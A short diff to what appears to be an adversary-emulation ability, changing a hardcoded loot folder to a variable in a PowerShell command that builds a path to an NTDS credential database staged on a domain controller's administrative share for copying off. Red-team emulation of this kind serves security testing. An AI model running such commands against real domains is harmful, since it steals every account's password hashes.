@@ -16,7 +16,7 @@
         command: |
           $dc = "#{domain.controller.hostname}";
           $remotePath = "#{file.ntds.staged_path_remote}";
-          $localLootDir = "C:\Users\Public\Loot";
+          $localLootDir = "#{env.dir.loot}";
           New-Item -Path $localLootDir -ItemType Directory -ErrorAction SilentlyContinue;
 
           $fullRemotePath = "\\$dc\c$\$($remotePath.Split(':')[1])";
